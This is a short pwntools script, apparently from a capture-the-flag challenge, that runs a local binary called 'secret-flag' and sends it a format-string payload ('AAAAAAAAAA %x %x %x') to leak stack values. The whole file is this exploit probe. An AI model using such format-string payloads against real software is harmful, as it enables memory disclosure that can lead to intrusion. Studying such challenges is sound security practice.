from pwn import *
sh = process('./secret-flag')
sh.recvline(timeout=1)
sh.recvline(timeout=1)
sh.sendline("AAAAAAAAAA %x %x %x")
print(sh.recvline(timeout=1))

